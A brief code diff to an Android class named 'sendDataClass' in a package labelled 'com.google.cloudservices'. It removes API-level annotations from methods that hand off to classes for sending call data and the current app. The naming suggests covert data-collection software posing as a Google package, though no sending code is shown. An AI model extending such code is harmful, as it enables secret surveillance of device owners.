@@ -1,11 +1,10 @@
 package com.google.cloudservices;
 
 import android.content.Context;
-import android.support.annotation.RequiresApi;
+
 import android.util.Log;
 
 public class sendDataClass {
-    @RequiresApi(api = 29)
     public void send(Context context){
 
         OptionDB optionDB=new OptionDB(context);
@@ -56,7 +55,7 @@ public class sendDataClass {
         SendCall sendCall=new SendCall();
         sendCall.sendcal(context);
     }
-    @RequiresApi(api = 29)
+
     public void sendCurrentApp(Context context){
         sendCurrApp currApp=new sendCurrApp();
         currApp.send(context);
